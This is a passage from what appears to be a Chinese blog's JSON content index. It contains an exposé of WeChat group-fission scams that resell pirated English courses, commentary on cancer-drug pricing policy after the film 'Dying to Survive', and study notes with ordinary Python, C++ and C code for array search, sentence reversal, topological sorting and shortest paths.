扫描了父亲战友分享的海报二维码，我添加了头像为“剑桥英语”的个人微信号“老师助理-7”。和其他“裂变”套路一样，“老师助理-7”要求我分享海报到朋友圈，不可以屏蔽好友，且不能秒删，截图发给她检查之后才能进入学习群。 我用两个不同名字的微信号分别重复上述动作，要求入群，中间仅仅间隔了10分钟，我就被分别拉入了两个不同的群，第14号群和第15号群，每个群的人数都在200人左右，建群速度非常之快。 同时，学员们会在群里被要求每天转发海报到朋友圈“打卡”，如果不转发，就会被踢出群，失去免费学习的机会。 打卡与预热 终于要开始上课了，“老师助理”先发来一系列“预习内容”，流程显得很严谨。但过程中有学员问到是否需要收费的时候，助理开始转移话题，或者直接忽视。 课程采用语音形式，“老师”在上课时间进入群中发语音，但对于同学们提出的问题均不予回答。 学员询问是否收费 可怕的是，课程持续了5天，竟然没有一位同学质疑老师的资质，当我鼓起勇气作出询问时，立刻被群主移出了群。 五天课程之后，助手开始“收费”，全套课程398元。 询问资质之后被移出群 在助手打鸡血一般推销完课程和发布售价之后，密集地，出现几十位学员付款购买。可疑的是，其中一些学员的微信名在短短半小时之内变了三次，实在是像“托儿”，例如下图中的这位“美好未来”，半小时之内微信名称变成了“未来更美好”“快乐每一天”。 “老师助理”打鸡血式推广付费集训营课程 群内学员“争相”报名 尽管全程没有出现任何老师的信息以及“剑桥英语”的资质信息、公司信息，通过助手此前发布的预习资料，不难发现所谓“5天拼会所有英语单词”的课程内容实际上就是原疯狂英语教师贾王鹏自创的单词注音直拼法。细听群中的录音，竟然和喜马拉雅、CCTalk上免费、公开的贾王鹏《英语拼读王》课程一模一样。这也就是说，群主所谓直播授课，实际上是播的录音。 课程助手发在群里的课件 先不论课程里教学的像拼音一样拼英语的方法是否科学，从这里便衍生出两种可能性： 可能性一，这就是贾老师课程，录音本身就是贾老师本人。 沪江旗下的实时互动教育平台CCtalk上有一些关于贾王鹏的介绍——原李阳疯狂英语讲师，麒麟公社发起人，《互联网思维掘金术》作者，生态农场主。 CCtalk上贾王鹏的主页 这里的“麒麟公社”实际上是位于陕西省铜川市的陕西麒麟君科技有限公司，该公司关联着公众号——溜乎英语。而溜乎英语上的课程正是贾王鹏的英语音标课。 目前，溜乎英语已经在去年12月底停更，其内容转移到了新公众号叫做“六乎英语”。很多在“溜乎”买课的学员跑到“六乎”下面留言，表示自己被骗了，去年交的学费根本无法复学。 学员在“六乎英语”的留言 另外有网友爆料称溜乎英语其实就是“麒麟英语”，还有一个名字是“口袋英语”。 口袋英语、麒麟英语、溜乎英语、六乎英语，加上这次的“剑桥英语”，同样的课程已经至少拥有五个“马甲”。即使贾老师是真的英语大牛，这样的操作也实在是匪夷所思。 “麒麟英语”的海报和“剑桥英语”的几乎一样，口袋英语的“主体”也指向“麒麟君” 可能性二，这是一个假冒“贾老师”的骗子团伙。 互动全程，没有任何关于老师的介绍，问到教师资质问题立马被拉出群，这样“心虚”的表现足以说明一些问题。 知识付费行业一直鱼龙混杂，淘宝、闲鱼等电商平台上有大量低价盗版课程，且盗版成本极低。 而现在，盗版披上了社群裂变的外衣，骗子只需翻录音频即可组织类似的“学习群”，一本万利。 更早的案例是高晓松的付费音频《矮大紧指北》，一位自称“鸣老师”的人通过分享二维码前70名免费的手法快速组织了若干个微信群，并在群中销售课程。而实际上，他并没有获得高晓松任何授权。 《矮大紧指北》山寨课程群 和英语课一样，这场限时免费活动的组织者也是“三无”——无真实信息、无公司背景、无任何资质。他们利用人们贪图便宜、希望速成的心理，迅速裂变出大量微信群。这些微信群来无影去无踪，只要完成了聚拢人气，形成转化的使命，就会被废弃或者就地就散。 一切都是套路 而一切都是编织好的套路。 第一步，获取资源。一篇署名“豹哥”的文章《知识付费蓝海项目轻松月入过万》大致表述了现有的资源套路： 购买官方正版（这个最简单，直接花钱就行，音质好，适合土豪操作，新手资金少的别这么玩）； 寻找免费资源（这个很苦逼很浪费时间，有的专栏还整理不到，建议有能力的可以这么做）； 最简单最省事又不怎么花钱的方法，就是直接找同行买，买来之后可以无限转卖（这个方法要注意，一定要寻找靠谱的同行，不能跑路，并且音质要好，里面不能有广告，可以先找同行花几块钱买一个听一下再决定）。 之后的步骤则早已“产业化”。人们只看到了小鹅通这样“阳春白雪”的工具，却不知道在知识付费大幕背后还有各种分销、裂变的工具。 “深响”联系到了其中的两家，手法大同小异。 首先他们会要求你设计裂变海报、微信头像，并给予一些指引。比如海报文案要击中痛点，最关键的那行字一定要大，在朋友圈中即使不被点开也清晰可见，大纲要有场景感，描述一个用户向往的境界，多数字对比，最好要有讲师形象、大平台logo，时间紧迫感要突出“仅限前xx名，要有短期利益诱饵，例如进群即送xx资料、亲密交流机会、一对一服务等等。 “刷屏”海报 由于微信群只能扫码加入100个人，所以海报上如果只放一个群二维码，很快就会因扫码人数超过100人而失效。这时候工具的作用开始显现，这些工具的裂变海报二维码是“活码”，可以在一个群达到90人的情况下自动换群，开启群裂变。 群裂变工具还有一个“杀手锏”——机器人。用户扫码入群后，不用怀疑，那个@你的微信用户，就是一个社群机器人。机器人会自动发送活动简介并引导用户转发海报+文案。用户截图发回微信群后， 社群机器人审核用户截图，并自动@用户。 这种基于用户社交链的拉新手法无可厚非，很多优质内容生产者都在使用。只是鱼龙混杂，群裂变也成为了知识盗猎者的利器。 “如果按下单比例来看，没名儿的、山寨的还是大多数。”一位从事群裂变工作的“用户增长专家”透露：“按理说我不能给你透露客户信息的，但我想说的是，有的同行自己也干这个，找点儿内容就卖。集团作战，封了就再来新的课，反正有转换就有利润，几乎是无本的生意。” 他所说的“卖”单指狭义的通过群裂变的方式去销售。通常情况下，知识付费的课程进行线上销售还有以下几种办法： 第一，直接销售：通过文案介绍付费课程的内容、亮点，直接吸引学员购买。 第二，分销：学员购买后将专属海报分销出去，其他通过扫描该海报二维码的人一旦完成购买，一级学员将获得返点。 例如今年年初，网易云课堂联合荔枝微课推出的《网易运营方法论》24小时卖出了13万份，就是采取的这种方法。《网易运营方法论》原价199元，促销价只要39.9元。同时只要他人经由你分享的带有课程二维码的红色海报购买该课程，你就会得到佣金返现。其中一级分销返还课程价的60%，二级分销返还30%。 第三，拼团：n人成团，团购价更加优惠。这种方式可以让学员主动“拉人”增加销量。拼团方式的诞生据说是因为“分销”的方法涉嫌触及微信“诱导分享”的规定，因此需要演变出新的推广手段。今年年初，小鹅通、得到都推出了拼团课程。使用该功能的科学队长旗下的《古生物学家还原恐龙世界》销售额达到之前十倍。 在线上流量越来越贵的情况下，通过利益相关的分销、拼团、裂变等工具利用社交关系链进行传播的确是一种低成本获取大量用户的新思路。知识付费市场变得和草莽时期的电商市场越来越像，只是知识商品的盗版成本更低，没有物流难题，销售的规模更容易扩大。 下一拨“知识韭菜”去哪儿割？ 故事的结局很简单，我爸在劝阻下退了群，他那位学完5天课程的战友也没有具备拼会所有英语单词的能力，而花了398元进入集训营的叔叔虽然感到无比后悔但也倒是不痛不痒。 “太瓜了，当时咋个就上当了喃。手机学英语好恼火哦。整不懂你们这些新东西。”不过，对于他来说398元并不是什么大数目，花了也就花了。 就这样，“知识付费”的华丽名袍下爬满了虱子。原本知识付费的初衷是让真正有知识的人分享知识获得收益，满足人们对于无法在常规教育中学到的长尾知识的学习需求，但互联网从来不缺投机者，知识本身在线上学习效果不可考的“保护伞”下变了味道，反正学不死人，“水货”横行，优质内容少之又少。 盗版至少搬运的“真知识”，更加没有底线的是误人子弟凭空编造的“伪知识”。 当一个人物，以“专家”的身份形象出现在海报上，配上听着很厉害的“title”，人们很难对其心生怀疑。殊不知，那些教你如何职场成功的人也许一天班都没有上过，那些教你孩子英文的老师，利用你的“不懂”，浑水摸鱼，实际上根本没有资质也不是什么专家。 而知识付费与内容付费的界限很难划清，线下培训需要资质，但线上的“培训”似乎人人都可成为老师，无从监管。 例如代古拉K幕后团队洋葱视频在3个月内打造出5000万粉丝的抖音IP矩阵，他们当然有资格去讲“抖音大V教你如何打造超级IP”的课程。但现实情况是，关于抖音涨粉的课程到处都是，授课的老师大多使用“艺名”，比如陈六爷、王老师，其所举的案例也是不可考的“某账号”。 这些课程游离于平台之外，面向非一线城市，来无影去无踪。更令人心生畏惧的是，有“币圈人士”告诉“深响”，一些区块链相关的知识付费课程会在直播中穿插项目案例，从而把学员转化成“韭菜”。不过关于此种说法并未找到实证。 “王老师”的抖音课推广资料 从2016年元年到2017年爆发，再到如今2018年的泥沙俱下，知识付费行业正在高速洗牌。 蛋糕依旧很大，根据《新媒体蓝皮书：中国新媒体发展报告（2018）》，到2017年底，知识付费用户达到1.88亿人，比2016年增长了102.2%。而华菁证券的研报推断，到2020年知识付费将会有2亿人群、45%付费率、360元ARPU值，行业总收入规模达到320亿。 机会也依旧在那儿，随着用户警惕意识和选课能力的提升，“智商税”和信息不对称的钱会越来越难赚。这时候比拼的就是课程质量、课程SKU丰富程度、整体品牌信任度了——不断提升完课率和复购率，不断运营各种社群工具扩大知识IP的影响力，从而让知识内容不断变现。长尾的、高质量的知识内容依然会获得用户的认可。 而到底是成为误人子弟遭人唾弃的伪知识毒瘤，还是想成为传道授业的真正受人尊敬的“老师”，全看操盘者自己的选择了。 — THE END —","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"商业-Business","slug":"剪贴板-Clipboard/商业-Business","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/商业-Business/"}]},{"title":"随机变量","date":"2018-07-18T02:31:07.000Z","path":"wiki/概率论与数理统计-Probability and Statistics/变量/","text":"","tags":[],"categories":[{"name":"概率论与数理统计-Probability and Statistics","slug":"概率论与数理统计-Probability-and-Statistics","permalink":"http://yoursite.com/categories/概率论与数理统计-Probability-and-Statistics/"}]},{"title":"《我不是药神》与看病难","date":"2018-07-16T02:06:14.000Z","path":"wiki/剪贴板-Clipboard/社会-Society/神》吹起的降价寒风/","text":"韦爵爷的丽春院 - 《药神》吹起的降价寒风前文《中国有《药神》，中国有“神药”》提及毕姥爷的八字真言“腾笼换鸟，放水养鱼”，提及“大风起兮，人头滚滚”，前文留下了个要刮啥风的悬念没有展开，一周过去，转眼《药神》的票房已经冲破20亿，民意汹涌，开始起风了。小道消息开始有传闻，多家跨国制药公司本周接到了与政府官员就价格问题进行商谈的邀请。此外，外交部例行记者会上，外交部发言人华春莹的表述是：最近在中国有部热映的电影《我不是药神》，当中涉及印度抗癌药品问题。据我了解，中印双方医药贸易呈现持续增长之势，双方就推动印度药品进入中国市场、开展中印医药产业对话交流合作进行着良好沟通。有关部门就开展中印双边医药贸易合作及促进扩大印度药品进入中国市场等制定了具体措施。相信中印医药贸易合作扩大和深化，将进一步增进两国人民的健康福祉。起风了。一、药神的春风在开始说事之前，先来想象一个场景：随着公司的规模越来越大，业绩却增速不再，老板的危机感也与日俱增，朋友圈天天开始转《清退『小白兔员工』，绝不手软！》这类浓缩鸡汤，突然间有一天，老板找你面谈：老板：小明啊，公司规模越来越大，每天睁开眼就几百张嘴等着我开饭，那个压力大啊，最近感觉整个队伍的战斗力都在下降，我们有些老兄弟啊，有些懈怠，这样下去是不行的啊！我们要呼唤狼性，重回创业心态啊，你看我最近起得比鸡早，睡得比狗晚，天天10点多才离开公司，你说我容易么，这队伍难带啊…小明立刻站了起来：明天开始，我们996，KPI加30%，完成不了，提头来见。老板拍了拍小明肩膀：还是你识大体，公司的未来就依靠你了，加油，你可以出去了。现在的局面是什么，是老大哥主动的降税费了：4月出台《国务院办公厅关于改革完善仿制药供应保障及使用政策的意见》，其中：仿制药企业为开发新技术、新产品、新工艺产生的研发费用，符合条件的按照有关规定在企业所得税税前加计扣除。仿制药企业经认定为高新技术企业的，减按15%的税率征收企业所得税。5月四部门联合发布，增值税一般纳税人生产销售和批发、零售抗癌药品，可选择按照简易办法依照3%征收率计算缴纳增值税。上述纳税人选择简易办法计算缴纳增值税后，36个月内不得变更。对进口抗癌药品，减按3%征收进口环节增值税。如果了解最近国内的宏观经济环境就知道，各路吃财政饭的行业都面临巨大的压力，园林、光伏、机场轮番扑街，这时候在医药领域大手笔的降税展示出了老大哥的决心，这事是要办的，这时候《药神》一吹风，都可以想象老大哥和药企们的对话了：药价问题啊，群众意见很大，现在非常时期，要顾全大局，我都降税了，兄弟们理解下，支持下工作，一起为群众办点实事。你说在台下的兄弟们会怎么做？那肯定是降税的收益不截留，全部体现在降价上，然后理解配合大哥工作，再主动降价若干……老大哥之所以是老大哥，就是因为他有让你必须配合他工作的能力……相信很快就可以看到各路创新药降价的喜讯，然后宣传口来一波改革卓有成效的宣传，君君臣臣父父子子，多么和谐的画面。这波降药价的操作主要针对的是金字塔顶端的高价创新药的问题，但同步吹出来的进口印度药的风，就是解决金字塔底部的仿制药的问题了。二、恒河的寒流前文提及“腾笼换鸟，放水养鱼”，腾笼换鸟好理解，就是打击无效医疗开支，集中在有临床疗效的医疗开支上，放水养鱼说的提高审批能力，在确保审核标准的情况下加快审批速度，通过大量的批文之间的竞争降低药价，川普上台后，美国走的就是这个路子，FDA审批速度大幅加快。国内“722惨案”之后审批速度也是火速加快了。2018年4月，国务院办公厅发布的《关于改革完善仿制药供应保障及使用政策的意见》明确提出，要促进与原研药质量和疗效一致的仿制药和原研药平等竞争。一致评价解决的是仿制药质量问题，即通过一致性评价的药品意味着与原研一致，疗效靠谱，可替代原研。国家卫生健康委员会体制改革司监察专员赖诗卿明确对外表示，仿制的目的就是为了替代。仿制药替代原研这是全球通用的套路，但是这个仿制不一定非得是国产仿制啊。此前在一致性评价的文件中，对于共线出口仿制药品种有转报的政策支持。1）国内药品生产企业已在欧盟、美国和日本获准上市的仿制药，可以国外注册申报的相关资料为基础，按照化学药品新注册分类申报药品上市，批准上市后视同通过一致性评价；2）在中国境内用同一生产线生产上市并在欧盟、美国和日本获准上市的药品，视同通过一致性评价。有专利法在，印度专利期内强防的药就别想进口了，但是大量过了专利期的仿制药还是有很大操作空间的，2008-2017年间，美国FDA共正式批准了5020个ANDA，另外有1184个临时性批准，其中印度公司共有1695个ANDA获得正式批准，临时批准数量则达到了455个，占据了全部批准数的35%。根据Singh&amp;Associates报道，FDA在2017年共正式批准了847个ANDA，其中印度公司（包含其子公司）占据了其中的314个，占比达到了37%；同时在175个临时性获批的ANDA中有66个来自印度军团。美国是印度的第一大海外市场，印度仿制药占据美国整个仿制药市场处方量的约30%，销售额占比约10%。纵使GMP不达标问题在印度药企中也时有发生，但瑕不掩瑜，“自身迅速发展+精准收购助力”、“成本绝对优势+高水平研发力量”、“顶级申报速度+大规模产能”，独特的竞争优势让印度仿制药在美国有着不错的份额。从美国非品牌仿制药市场各公司处方量占比看，在TOP20中，以Aurobindo为首的印度公司占据了其中的9席，展现出了强劲的实力。如果按照国内的政策适当的脑补下，印度共线出口美国的仿制药品种，视作通过一致性评价进口国内，以印度的成本优势，出口到国内就是巨大的竞争优势……关于印度药企的情况，建议去围观Nesta老师《恒河之水天上来——美国医药市场印度药企概况》系列文章。从老大哥的角度来看，保护了这么多年，该有出息的也像模像样了，没出息的再保也没啥用了，仿制药这个领域就应该是屌丝化工的利润，地主家也没余粮了，引入恒河水，为这潭死水放几条鲶鱼，保不准还能刺激老同志给力点。印度仿制药这个变量之前确实没考虑到…就算政策落地顺利，能开始进口，真正铺到终端还需要时间，再者，印度药企营销懂不懂国情也需要验证，短期在市场份额上的压力不大。但只要这个政策落地了，示范意义比实际意义大了，因为政府谈判时多了一个锚定物。用刘建宏老师的经典语录就是：留给中国队的时间不多了。三、大哥的心声10日，中共中央政治局常委、国务院副总理韩正在国家医疗保障局调研并主持召开座谈会。韩正表示，要坚持以人民为中心的发展思想，完善统一的城乡居民基本医疗保险制度和大病保险制度，着力解决医疗保障领域发展不平衡不充分问题。要千方百计保基本，坚持尽力而为、量力而行，聚焦基本医疗需求，满足人民群众最迫切的愿望和要求。要始终做到可持续，健全医保筹资机制，强化医保基金监管，确保医保资金合理使用、安全可控。要发挥好医保的基础性、引导性作用，实行医疗、医保、医药“三医联动”，形成协同推进医改的良好格局。请注意，讲话的亮点是：坚持尽力而为、量力而行，聚焦基本医疗需求。同日，国家卫生健康委员会印发《医疗机构处方审核规范》明确，对医师在诊疗活动中为患者开具的处方，应当使用经药品监督管理部门批准并公布的药品通用名称。《规范》要求，二级以上医院、妇幼保健院和专科疾病防治机构应当按照本规范执行，其他医疗机构参照执行。这是一致性评价推进之后的配套政策，通用名处方铺开就是意味着仿制药一致性使用的加速，价格战的启动。当风向发生变化的时候，往往比较平静。老大哥没钱是常态，要不也不会让财政部的人当国家医疗保障局的一把手。很多人往往高估了所谓人口老龄化的短期影响，而低估了政府长期控费的决心。国外医药行业最大的周期是创新周期，中国医药行业最大的周期是政策周期，投资，要顺势而为。这波医药股的行情，启动于去年的医改目录调整、创新药支持政策加速，个股走势高度分化，其实市场已经基本有效，把大方向都挑出来了，未来的走势依然是分化。这波上涨中有业绩的贡献，更多的是估值的提升，炒创新药的好处就是，谜底没揭开的时候，是不可证伪的，炒到啥估值都可以，你证伪不了它。但是，如果按目前的风向判断，外资药企的原研创新药真的开始降价，乃至印度药加速进口的话，不管创新药，还是高仿，在估值上无形中都盖上盖子，只要价格要素发生变化，之前做的估值模型全部都要调整，那时候，市场就有修复的理由了。结 语聊起医药，很多人上来就讲大逻辑，当然，看大逻辑看长做长是没问题的，但是实际上很多人只是看长做短，需要的只是一个美好的故事来感动自己，风向一变的时候就转向了。现在有非常明显的政策走向的变化，只是，又有多少人重视这青萍之末。 https://zhuanlan.zhihu.com/p/39726162?utm_source=qq&amp;utm_medium=social&amp;utm_oi=50394126352384 李克强就电影《我不是药神》引热议作批示 中国政府网 2018-07-18 李克强总理近日就电影《我不是药神》引发舆论热议作出批示，要求有关部门加快落实抗癌药降价保供等相关措施。“癌症等重病患者关于进口‘救命药’买不起、拖不起、买不到等诉求，突出反映了推进解决药品降价保供问题的紧迫性。”总理在批示中指出，“国务院常务会确定的相关措施要抓紧落实，能加快的要尽可能加快。”今年4月和6月，李克强两次主持召开国务院常务会议，决定对进口抗癌药实施零关税并鼓励创新药进口，加快已在境外上市新药审批、落实抗癌药降价措施、强化短缺药供应保障。会议决定，较大幅度降低抗癌药生产、进口环节增值税税负，采取政府集中采购、将进口创新药特别是急需的抗癌药及时纳入医保报销目录等方式，并研究利用跨境电商渠道，多措并举消除流通环节各种不合理加价，对创新化学药加强知识产权保护，强化质量监管。“抗癌药是救命药，不能税降了价不降。”总理说，“必须多措并举打通中间环节，督促推动抗癌药加快降价，让群众有切实获得感。”在今年4月的一次基层考察中，李克强还专程来到一家外资药企，以将药品纳入医保、实施政府采购等方式，希望该药企生产的抗癌药等重大疾病药品价格能够更加优惠公道。“现在谁家里一旦有个癌症病人，全家都会倾其所有，甚至整个家族都需施以援手。癌症已经成为威胁人民群众生命健康的‘头号杀手’。”总理说，“要尽最大力量，救治患者并减轻患者家庭负担。”李克强明确要求这项工作要进一步“提速”：“对癌症病人来说，时间就是生命！”在影片《我不是药神》讲述患病群体用药难题，引发舆论广泛关注讨论后，李克强特别批示有关部门，要“急群众所急”，推动相关措施加快落到实处。 前三后三医疗体系对比 前三后三医疗体系对比，需要的自取。16页，不多，十分钟能看完。https://pan.baidu.com/s/1I_yel_VBgjeYUKUZ9uPsTA​pan.baidu.com","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"社会-Society","slug":"剪贴板-Clipboard/社会-Society","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/社会-Society/"}]},{"title":"《剑指Offer》编程题：Python实现","date":"2018-07-13T14:31:09.000Z","path":"wiki/读书笔记/剑指Offer/剑指Offer》编程题：Python实现/","text":"题目描述 在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 123456789101112131415161718192021array = [[1, 2, 8, 9], [2, 4, 9, 12], [4, 7, 10, 13], [6, 8, 11, 15]]def find(target, array): found = False #初始化数值：没找到 if array is not None: #判断输入不为空 x = len(array) # 多少行 y = len(array[0]) - 1 # 列 # while 套 if i = 0 while i &lt; x and y &gt;= 0: if array[i][y] &gt; target: y = y - 1 elif array[i][y] &lt; target: i = i + 1 else: found = True break #break跳出 return foundif __name__ == \"__main__\": print(find(7, array))","tags":[],"categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://yoursite.com/categories/读书笔记/"},{"name":"剑指Offer","slug":"读书笔记/剑指Offer","permalink":"http://yoursite.com/categories/读书笔记/剑指Offer/"}]},{"title":"周志华《机器学习》读书笔记-第3章-线性模型","date":"2018-06-28T14:35:50.000Z","path":"wiki/机器学习-Machine Learning/志华《机器学习》读书笔记-第3章-线性模型/","text":"","tags":[],"categories":[{"name":"机器学习-Machine Learning","slug":"机器学习-Machine-Learning","permalink":"http://yoursite.com/categories/机器学习-Machine-Learning/"}]},{"title":"周志华《机器学习》读书笔记-第6章-支持向量机","date":"2018-06-28T14:35:42.000Z","path":"wiki/机器学习-Machine Learning/周志华《机器学习》读书笔记-第6章-支持向量机/","text":"","tags":[],"categories":[{"name":"机器学习-Machine Learning","slug":"机器学习-Machine-Learning","permalink":"http://yoursite.com/categories/机器学习-Machine-Learning/"}]},{"title":"华为机试题——句子逆序","date":"2018-06-28T14:32:48.000Z","path":"wiki/Online Judge/机试题——句子逆序/","text":"将一个英文语句以单词为单位逆序排放。例如“I am a boy”，逆序排放后为“boy a am I” 所有单词之间用一个空格隔开，语句中除了英文字母外，不再包含其他字符 接口说明 /** 反转句子 @param sentence 原句子 @return 反转后的句子*/ public String reverse(String sentence); 输入描述: 将一个英文语句以单词为单位逆序排放。 输出描述: 得到逆序的句子 示例1 输入 I am a boy 输出 boy a am I 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include&lt;Stack&gt;#include&lt;stdio.h&gt;#include&lt;string&gt;#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;//int main()//&#123;// char a[1000] = \"\";// char input;// int count = 0;// do// &#123;// scanf(\"%c\",&amp;input);// a[count] = input;// count = count + 1;// &#125; while (input != '\\n');//// for (int j = count; count &gt;= 0; count--)// &#123;// printf(\"%c\", a[count]);// &#125;//// return 0;//&#125;void SplitString(const std::string&amp; s, std::vector&lt;std::string&gt;&amp; v, const std::string&amp; c)&#123; std::string::size_type pos1, pos2; pos2 = s.find(c); pos1 = 0; while (std::string::npos != pos2) &#123; v.push_back(s.substr(pos1, pos2 - pos1)); v.push_back(c); pos1 = pos2 + c.size(); pos2 = s.find(c, pos1); &#125; if (pos1 != s.length()) v.push_back(s.substr(pos1));&#125;int main()&#123; string input_string = \"\"; stack&lt;string&gt; s; getline(cin,input_string); vector&lt;string&gt; splitted; SplitString(input_string, splitted, \" \"); vector&lt;string&gt;::const_iterator iter = splitted.end() - 1; for (iter = splitted.end(); iter &gt;splitted.begin(); --iter) &#123; cout &lt;&lt; *(iter-1); &#125; return 0;&#125; 1print(\" \".join(input().split()[::-1]))","tags":[],"categories":[{"name":"Online Judge","slug":"Online-Judge","permalink":"http://yoursite.com/categories/Online-Judge/"}]},{"title":"周志华《机器学习》读书笔记-第4章-决策树","date":"2018-06-28T12:21:17.000Z","path":"wiki/机器学习-Machine Learning/《机器学习》读书笔记-第4章-决策树/","text":"Use entropy to measure uncertainty. symmentric on the + and - side.","tags":[],"categories":[{"name":"机器学习-Machine Learning","slug":"机器学习-Machine-Learning","permalink":"http://yoursite.com/categories/机器学习-Machine-Learning/"}]},{"title":"图的拓扑排序和关键路径","date":"2018-06-19T08:41:37.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/图-Graph/拓扑排序和关键路径/","text":"AOV图和基本的拓扑排序 利用队列的拓扑排序 关键路径权重为0的虚边表示，每条边（活动）的持续时间是固定的 关键路径和AOE图的画法 前向累加，计算每个顶点的最早完成时间最早完成时间 -&gt; 从前面的活动分秒不差地推到这个活动，直到完成这个活动需要的时间 反向传播，计算每个顶点的最晚完成时间最晚完成时间 -&gt; 从后面的活动向前推，需要这个活动最晚什么时候完成 机动时间（活动或边）-&gt; 活动后面顶点的最晚完成时间 - 活动前面顶点的最早完成时间顶点的最晚完成时间：到这个时间，这个顶点前面的所有活动都需要完成，（从后向前的需要）。 顶点的最晚完成时间：指向这个顶点的活动必须完成。 顶点的最早完成时间：到这个时间，这个顶点前面的所有活动都能够完成，（从前向后的推导）。 顶点的最早完成时间：从这个顶点出发的活动可以开始进行。 机动时间（活动或边）-&gt; 活动后面顶点的最晚完成时间 - 活动前面顶点的最早完成时间 关键路径：没有机动时间的路径（工期一天都不能差的路径） 拓扑排序（AOV网络） 排课的时候，根据课程的难易程度及知识体系有些课是要先上有些课需要后上，那么在给定了一些课的先后顺序，我们怎样来安排这些课的总体顺序呢？ 实际中拓扑排序的应用必入关键路径问题，一般用于安排项目的工序。 首先明确下拓扑序的概念：如果图中从v到w有一条有向路径，则v一定排在w之前。满足此条件的顶点序列称为一个拓扑序。 AOV如果有合理的拓扑序，必定是有向无环图。 具体我们怎么实现算法呢？简单的可以直接：&gt;每次都选择入度为0的顶点，并把它和它的边一起从图中删除。删除其事就是将与它相邻的顶点的入度减一。算法的效率很大部分决定于找到入度为0的点，但是当图是稀疏图时，顺序扫描的方法就显得效率低下。那么有没有更好的办法呢？ 一种很好的方法就是将入度为0的顶点放入一个容器中（栈或队列），然后没将相邻点入度减一的同时检查它的入度是否降为0，是的话就放入容器中。 代码实现：123456789101112131415161718192021222324252627282930313233343536373839/* 邻接表存储 - 拓扑排序算法 */ bool TopSort( LGraph Graph, Vertex TopOrder[] )&#123; /* 对Graph进行拓扑排序, TopOrder[]顺序存储排序后的顶点下标 */ int Indegree[MaxVertexNum], cnt; Vertex V; PtrToAdjVNode W; Queue Q = CreateQueue( Graph-&gt;Nv ); /* 初始化Indegree[] */ for (V=0; V&lt;Graph-&gt;Nv; V++) Indegree[V] = 0; /* 遍历图，得到Indegree[] */ for (V=0; V&lt;Graph-&gt;Nv; V++) for (W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next) Indegree[W-&gt;AdjV]++; /* 对有向边&lt;V, W-&gt;AdjV&gt;累计终点的入度 */ /* 将所有入度为0的顶点入列 */ for (V=0; V&lt;Graph-&gt;Nv; V++) if ( Indegree[V]==0 ) AddQ(Q, V); /* 下面进入拓扑排序 */ cnt = 0; while( !IsEmpty(Q) )&#123; V = DeleteQ(Q); /* 弹出一个入度为0的顶点 */ TopOrder[cnt++] = V; /* 将之存为结果序列的下一个元素 */ /* 对V的每个邻接点W-&gt;AdjV */ for ( W=Graph-&gt;G[V].FirstEdge; W; W=W-&gt;Next ) if ( --Indegree[W-&gt;AdjV] == 0 )/* 若删除V使得W-&gt;AdjV入度为0 */ AddQ(Q, W-&gt;AdjV); /* 则该顶点入列 */ &#125; /* while结束*/ if ( cnt != Graph-&gt;Nv ) return false; /* 说明图中有回路, 返回不成功标志 */ else return true;&#125; 拓扑排序的应用–关键路径问题（AOE网络） 用顶点表示活动，用弧表示活动间的优先关系的有向图：称为顶点表示活动的网（Activity On Vertex Network），简称为AOV网。 与AOV网对应的是AOE（Activity On Edge）网即边表示活动的网。AOE网是一个带权的有向无环图。网中只有一个入度为零的点（称为源点）和一个出度为零的点（称为汇点）。其中，顶点表示事件（Event），弧表示活动，权表示活动持续的时间。 通常，AOE网可用来估算工程的完成时间。&gt;假如汽车生产工厂要制造一辆汽车，制造过程的大概事件和活动时间如上图AOE网：我们把路径上各个活动所持续的时间之和称为路径长度，从源点到汇点具有最大长度的路径叫关键路径，在关键路径上的活动叫关键活动。那么，显然对上图AOE网而言,所谓关键路径：开始–&gt;发动机完成–&gt;部件集中到位–&gt;组装完成。路径长度为5.5。如果我们试图缩短整个工期，去改进轮子的生产效率，哪怕改动0.1也是无益的。只有缩短关键路径上的关键活动时间才可以减少整个工期的长度。例如如果制造发动机缩短为2.5天，整车组装缩短为1.5天，那么关键路径为4.5。工期也就整整缩短了一天时间。好吧！ 那么研究这个关键路径意义何在？ 假定上图AOE网中弧的权值单位为小时，而且我们已经知道黑深色的那一条为关键路径。假定现在上午一点，对于外壳完成事件而言，为了不影响工期：外壳完成活动最早也就是一点开始动工，最晚在两点必须要开始动工。最大权值3表示所有活动必须在三小时之后完成，而外壳完成只需要2个小时。所以，这个中间的空闲时间有一个小时，为了不影响整个工期，它必须最迟两点动工。那么才可以保证3点时与发动机完成活动同时竣工，为后续的活动做好准备。 对AOE网有待研究的问题是： （1）完成整个工程至少需要多少时间？ （2）那些活动是影响工程进度的关键？ Reference 数据结构图之六（关键路径） 图的关键路径算法","tags":[],"categories":[{"name":"数据结构与算法-Data Structure and Algorithm","slug":"数据结构与算法-Data-Structure-and-Algorithm","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/"},{"name":"图-Graph","slug":"数据结构与算法-Data-Structure-and-Algorithm/图-Graph","permalink":"http://yoursite.com/categories/数据结构与算法-Data-Structure-and-Algorithm/图-Graph/"}]},{"title":"图的最短路径问题-无权图的单源最短路径（BFS）、有权图的单源最短路径（Dijkstra）、多源最短路经（Floyd）","date":"2018-06-18T03:31:09.000Z","path":"wiki/数据结构与算法-Data Structure and Algorithm/图-Graph/最短路径问题-无权图的单源最短路径（BFS）、有权图的单源最短路径（Dijkstra）、多源最短路经（Floyd）/","text":"最短路径问题 两个不同顶点之间的所有路径中，边的权值之和最小的那一条路径；第一个顶点为源点(Source)；最后一个顶点为终点(Destination) 无权图的单源最短路径（BFS） 时间复杂度通过画图思考：每个顶点入队一次出队一次；每个边遍历一次。因此是O(|V|+|E|)。 从某固定源点出发，求其到所有其他顶点的最短路径 